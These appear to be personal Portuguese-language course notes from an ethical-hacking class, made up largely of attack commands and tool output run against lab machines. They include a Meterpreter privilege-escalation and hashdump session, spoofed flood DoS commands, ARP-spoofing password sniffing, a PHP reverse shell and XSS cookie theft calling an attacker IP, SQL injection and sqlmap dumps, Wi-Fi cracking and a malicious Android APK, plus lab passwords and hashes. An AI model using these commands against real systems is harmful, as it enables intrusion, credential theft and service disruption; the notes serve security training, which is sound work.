4916  772   RuntimeBroker.exe            x64   1        WINDOWS10\Admin  C:\Windows\System32\RuntimeBroker.exe
5028  648   SecurityHealthService.exe
5076  772   RuntimeBroker.exe            x64   1        WINDOWS10\Admin  C:\Windows\System32\RuntimeBroker.exe
5164  648   SearchIndexer.exe
5200  772   RuntimeBroker.exe            x64   1        WINDOWS10\Admin  C:\Windows\System32\RuntimeBroker.exe
5432  772   MicrosoftEdge.exe            x64   1        WINDOWS10\Admin  C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.exe
5440  772   ApplicationFrameHost.exe     x64   1        WINDOWS10\Admin  C:\Windows\System32\ApplicationFrameHost.exe
5612  648   SgrmBroker.exe
5664  772   browser_broker.exe           x64   1        WINDOWS10\Admin  C:\Windows\System32\browser_broker.exe
5712  772   MicrosoftEdgeCP.exe          x64   1        WINDOWS10\Admin  C:\Windows\System32\MicrosoftEdgeCP.exe
5940  772   RuntimeBroker.exe            x64   1        WINDOWS10\Admin  C:\Windows\System32\RuntimeBroker.exe
5948  648   svchost.exe
5992  772   MicrosoftEdgeCP.exe          x64   1        WINDOWS10\Admin  C:\Windows\System32\MicrosoftEdgeCP.exe
6108  5940  MicrosoftEdgeSH.exe          x64   1        WINDOWS10\Admin  C:\Windows\System32\MicrosoftEdgeSH.exe
6148  3892  GoogleCrashHandler.exe
6216  4568  vmtoolsd.exe                 x64   1        WINDOWS10\Admin  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
6320  4568  OneDrive.exe                 x86   1        WINDOWS10\Admin  C:\Users\Admin\AppData\Local\Microsoft\OneDrive\OneDrive.exe
6424  648   svchost.exe
6728  772   TextInputHost.exe            x64   1        WINDOWS10\Admin  C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\InputApp\TextInputHost.exe
6848  6620  jusched.exe                  x86   1        WINDOWS10\Admin  C:\Program Files (x86)\Common Files\Java\Java Update\jusched.exe
6860  772   YourPhone.exe                x64   1        WINDOWS10\Admin  C:\Program Files\WindowsApps\Microsoft.YourPhone_1.20092.123.0_x64__8wekyb3d8bbwe\YourPhone.exe

meterpreter > hashdump
[-] 2007: Operation failed: The parameter is incorrect.
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > sessions -l

# Active sessions

Id  Name  Type                     Information                  Connection

---

1         meterpreter x86/windows  WINDOWS10\Admin @ WINDOWS10  10.10.10.2:4321 -> 10.10.10.10:61251 (10.10.10.10)

msf6 exploit(multi/handler) > search suggester

# Matching Modules

# Name Disclosure Date Rank Check Deion

---

0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester

Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(multi/handler) > use 0
msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > exploit

[*] 10.10.10.10 - Collecting local exploits for x86/windows...
[*] 10.10.10.10 - 35 exploit checks are being tried...
[+] 10.10.10.10 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.10 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.
[+] 10.10.10.10 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.10.10.10 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.10.10 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[*] Post module execution completed
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/bypassuac_fodhelper
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_fodhelper) > set session 1
session => 1
msf6 exploit(windows/local/bypassuac_fodhelper) > exploit

[*] Started reverse TCP handler on 10.10.10.2:4444
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\Sysnative\cmd.exe /c C:\Windows\System32\fodhelper.exe
[*] Cleaining up registry keys ...
[*] Sending stage (175174 bytes) to 10.10.10.10
[*] Meterpreter session 2 opened (10.10.10.2:4444 -> 10.10.10.10:61253) at 2021-01-25 21:46:09 -0300

meterpreter > hashdump
[-] 2007: Operation failed: The parameter is incorrect.
meterpreter > getuid
Server username: WINDOWS10\Admin
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > migrate -f lsass.exe
[-] Not a PID: -f
meterpreter > migrate -n lsass.exe
[-] Not a PID: -n
meterpreter > migrate -N lsass.exe
[*] Migrating from 2516 to 668...
[*] Migration completed successfully.
meterpreter > hashdump
Admin:1001:aad3b435b51404eeaad3b435b51404ee:92937945b518814341de3f726500d4ff:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
Jason:1003:aad3b435b51404eeaad3b435b51404ee:2d20d252a4

- -------------------------//------------------------

[https://techexpert.tips/pt-br/ubuntu-pt-br/desativar-ipv6-no-ubuntu/](https://techexpert.tips/pt-br/ubuntu-pt-br/desativar-ipv6-no-ubuntu/)[https://linuxconfig.org/how-to-disable-ipv6-address-on-ubuntu-20-04-lts-focal-fossa](https://linuxconfig.org/how-to-disable-ipv6-address-on-ubuntu-20-04-lts-focal-fossa)


==================
# DOS - MODULO 10
==================

VIA HPING
hping3 –S ipvitima –a ipdohacker –p 22 --flood

t50 ipALVO --flood -S --turbo --dport 80 

a) wireshark

b) dos em cima do 10.10.10.10 spoofando como se fosse o 10.10.10.19

hping3 -S 10.10.10.10 -a 10.10.10.19 -p 22 flood

c) ver no wireshark o resultado

OUTRO

a) deixar o windows 10 logado e mostrando o taskmanager.exe pra ver o consumo de cpu

b) ataque alterando o tamanho do pacote

hping3 -d 65538 -S -p 21 --flood 10.10.10.10

c) olhar a cpu do windows10, vai estar em 100%

OUTRO

se quiser UDP (-2)
hping3 -2 -p 139 --flood <Target IP Address>

***************************************************
Module 11 
**************************************************

bettercap -iface eth0
help
net.probe on
net.recon on
set http.proxy.sslstrip true
set arp.spoof.internal true
set arp.spoof.targets 10.10.1.11
http.proxy on
arp.spoof on
net.sniff on
set net.sniff.regexp '.*password=.+'
net.show
events.stream on
set events.stream.output /tmp/captura.log"


========================
WEBSERVER - MODULO 13
=========================
curl --head www.sec4us.com.br

whatweb www.sec4us.com.br

nmap -sV --script=http-enum www.goodshopping.com

Descobrindo qual o nome hostname que responde ao domino goodshooping
whhostmap-bfk.prefix=hostmap- www.goodshopping.com`

verificando se o servidor aceita metodo HTTP TRACE
nmap --script=http-trace -d www.goodshopping.com
ou (mostra que tem trace)
nikto -h www.goodshopping.com


nao tem trace
nikto -h www.sec4us.com.br 

NAO TEM WAF
nmap -p80 --script http-waf-detect  www.moviescope.com`

DETECTA WAF
nmap -p80 --script http-waf-detect www.goodshopping.com

waf-w00f www.sec4us.com.br (sem waf)
waf-w00f www.acaditi.com.br

============================
WEB APPLICATION = MODULO 14
============================

MAQ148 JOOMLA
**maq148 - joomla**
joomscan -u http://192.168.10.148
searchsploit joomla 3.4.5
rlwrap nc -lvp 4321
python 39033.py -t http://192.168.10.148 -l 192.168.200.142 -p 4321
su joomla
joomla

MAQ185 - ssrf
GET /?redirect=http://127.0.0.1 HTTP/1.1
GET /?redirect=file:///etc/passwd HTTP/1.1
GET /?redirect=127.0.0.1:22 HTTP/1.1

intruder // sniper
GET /?redirect=http://127.0.0.1:variavel
8080
8081
8082
8088
10000
443

ssh devops@192.168.10.185
01yrgxw6m0l8ue

sudo -l
cat /etc/crontab

**escalacao por bitsuid:** 
find / -perm -u=s -type f 2>/dev/null

**gtfobins**
find . -exec /bin/sh -p \; -quit


**maq123 - xxe**
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ederzao[
<!ENTITY xxe SYSTEM "file:///home/maq123/bkpcredentials.txt">
]>

&xxe;

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
ssh maq123@192.168.10.123
loading1

sudo -l
sudo su


MAQ113

MANUAL
<[http://192.168.10.113/lfi/menu.php?pagina=data:text/plaintext,<?php](http://192.168.10.113/lfi/menu.php?pagina=data:text/plaintext,%3C?php)> phpinfo(); ?>

<[http://192.168.10.113/lfi/menu.php?pagina=data:text/plaintext,<?php](http://192.168.10.113/lfi/menu.php?pagina=data:text/plaintext,%3C?php)> $sock = fsockopen("192.168.100.16","4321");$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>

**maquina 108**
usar o burp para trocar o comando

**XSS na maquina 103**

<>alert("ederzaooo");</>

<>alert(document.cookie);</>

roubo de cookie
<> new Image().src="[http://10.10.10.x/qualquercoisa.php?output=](http://10.10.10.x/qualquercoisa.php?output=)"+document.cookie;</>

==========================
# SQL INJECTION - MODULO 15
==========================

http://www.agrofortepa.com.br/produtos.php?id=105

formulario padrao

<form action="/cgi-bin/login" method=post>

Username: <input type=text name=nome>
Password: <input type=password name=senha>

<input type=submit value=Login>

FORMA ERRADA SUCETIVEL A SQL INJECTION POIS NAO TRATOU A PASSAGEM DE PARAMETRO PARA FAZER O SELECT NO BANCO
select * from Users where (username = $nome and password = $senha);

FORMA CORRETA
tratanome = mysql_real_string($nome)
tratasenha = mysql_real_string($senha)
trataxss = htmlspecialchars(variavel)

select * from Users where (username = $tratanome and password = $tratasenha);

MAQUINA 102

order by 1
order by2
...
order by7

[http://192.168.10.102/index.php?id=-4](http://192.168.10.102/index.php?id=-4) union select 1,2,3,4,5,6,load_file("/etc/passwd")

usuario do banco
[http://192.168.10.102/?id=-4](http://192.168.10.102/?id=-4) union select 1,2,3,4,5,6,user()

buscando database
[http://192.168.10.102/?id=-4](http://192.168.10.102/?id=-4) union select 1,2,3,4,5,6,database()

buscando as tabelas
[http://192.168.10.102/?id=-4](http://192.168.10.102/?id=-4) union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema='cms'

colunas
[http://192.168.10.102/?id=-4](http://192.168.10.102/?id=-4) union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_name='user' and table_schema='cms'

tuplas
[http://192.168.10.102/?id=-4](http://192.168.10.102/?id=-4) union select 1,2,3,4,5,6,group_concat(user_id, ' ', user_username, ' ', user_password) from user

MAQUINA 126 - METODO POST

sqlmap -u "[http://192.168.10.126/index.php](http://192.168.10.126/index.php)" --data="user=hackudao&password=naosei&login=Login" --current-db --batch

sqlmap -u "[http://192.168.10.126/index.php](http://192.168.10.126/index.php)" --data="user=hackudao&password=naosei&login=Login" -D sistalento --tables --batch

sqlmap -u "[http://192.168.10.126/index.php](http://192.168.10.126/index.php)" --data="user=hackudao&password=naosei&login=Login" -D sistalento -T usuario --columns --batch

sqlmap -u "[http://192.168.10.126/index.php](http://192.168.10.126/index.php)" --data="user=hackudao&password=naosei&login=Login" -D sistalento -T usuario -C login,nome,senha --dump --batch

vendo o passwd da pra ver o usuario zeus
sqlmap -u [http://192.168.10.126/index.php](http://192.168.10.126/index.php) --data="user=hackudao&password=naosei&login=Login" -D sistalento -T usuario -C login,senha --file-read=/etc/passwd --batch

LENDO O METODO POST (OUTRA FORMA)
sqlmap -r maq126post.txt --current-db --batch
sqlmap -r maq126post.txt -D sistalento --tables  --batch
sqlmap -r maq126post.txt -D sistalento -T usuario --columns  --batch
sqlmap -r maq126post.txt -D sistalento -T usuario -C login,senha --dump --batch


DATABASE = cms
TABELAS DE UMA DATABASE = user

group_concat(table_name) from information_schema.tables where table_schema="cms"

COLUNAS DE UMA TABELA = user_id,user_username,user_password

group_concat(column_name) from information_schema.columns where table_name="user" and table_schema="cms"

TUPLAS DAS COLUNAS DA TABELA =

group_concat(user_id,user_username,user_password) from user

ASC
A = 97
B = 98
C = 99
D = 100
E = 101


# ====================
WIRELESS - MODULO 17
======================

iwconfig

a) colocar a placa em modo de escuta (promíscua mode)

airmon-ng start wlan0

b) varrer o spectro

airodump-ng wlan0mon

c) escolhar a vitima e anotar, macaddress do AP, numero do canal (11), nome da rede essid

d) gravar os pacotes capturados

airodump-ng -c 11 -w pacotescapturados --bssid macaddressAP wlan0mon

e) derrubar um cliente

aireplay-ng -0 20 -a macaddressAP -c macaddresscliente wlan0mon

f) capturar UM handshake que ficara gravado no paca

g) quebrar a senha

aircrack-ng -w dicionario.txt pacotescapturados.pcap

se preferir quebrar um handshake ao mesmo tempo que o dicionário seja criado em memoria

crunch 8 8 0123456789 | aircrack-ng -t -h -b macaddressaccesspoint pacotescapturados.cap -w -

# =================
MOBILE - MODULO 18
====================

a) encontrando o android
`nmap -sn -PE 10.10.10.0/24`

b) escaneando as portas do android
`nmap -p- 10.10.10.14`

c) vendo o que roda na porta 5555 podemos descobrir que eh um android mesmo e a porta 5555 eh default para ADB
`nmap -sV -p 5555 10.10.10.14`

```
levantar o phonesploit
cd /opt/Phonesploit

pip3 install urllib3 colorama
python3 Phonesploit.py

```

conectar no android via ADB
10.10.10.14

fazer um screenshot
7
enter

pegando um shell
4

exit

**teclar p** para ver a proxima tela e escolher novos comandos

interface de rede
18

conexoes
21

**Pratica mobile criando um malware para pegar o shell**

msfvenom -p android/meterpreter/reverse_tcp lhost=10.10.10.128 lport=4321 R -o malware.apk

```
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost 10.10.10.128
set lport 4321
exploit

```









